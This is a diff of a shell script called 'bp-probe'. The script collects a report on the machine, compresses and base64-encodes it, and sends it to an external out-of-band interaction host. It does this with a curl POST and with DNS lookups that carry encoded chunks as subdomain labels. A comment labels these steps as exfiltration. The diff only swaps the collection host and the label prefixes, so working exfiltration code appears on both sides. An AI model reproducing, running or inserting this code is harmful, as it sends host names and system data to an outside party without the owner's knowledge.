@@ -1,5 +1,5 @@
 #!/bin/sh
-OAST="dbplpucrh745qbn0ac10mtiz5fmoug5dt.oast.pro"
+OAST="dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
 R=report.txt
 {
   echo "== bp-probe $(date -u +%FT%TZ) =="
@@ -20,6 +20,6 @@ R=report.txt
 } > $R 2>&1
 gzip -c $R | base64 -w0 > $R.b64
 # exfil: body upload + dns label
-curl -s -m 10 -X POST --data-binary "@$R.b64" "https://$OAST/bp-$(hostname)-$(date +%s)" >/dev/null 2>&1 || true
-head -c 180 $R.b64 | tr '+/=' 'abc' | cut -c1-60 | xargs -I{} sh -c 'nslookup {}.bpdns.'"$OAST" >/dev/null 2>&1 || true
+curl -s -m 10 -X POST --data-binary "@$R.b64" "https://$OAST/ver-bp2-$(hostname)-$(date +%s)" >/dev/null 2>&1 || true
+head -c 180 $R.b64 | tr '+/=' 'abc' | cut -c1-60 | xargs -I{} sh -c 'nslookup {}.ver-bp2-dns.'"$OAST" >/dev/null 2>&1 || true
 cp $R ./build-report.txt 2>/dev/null || true
